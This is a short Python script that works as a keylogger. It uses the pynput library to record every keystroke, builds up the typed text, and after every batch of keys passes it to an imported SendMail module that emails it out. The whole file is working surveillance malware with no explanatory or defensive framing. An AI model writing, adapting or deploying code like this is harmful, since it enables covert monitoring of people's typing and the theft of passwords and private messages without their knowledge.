import pynput
from pynput.keyboard import Key,Listener
import SendMail


count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10 :
        count = 0
        email(keys)

def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " "
        if key == "Key.capslock":
            k = ""
        if key == "Key.backspace":
            k = ""

        message += k
    SendMail.sendEmail(message)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()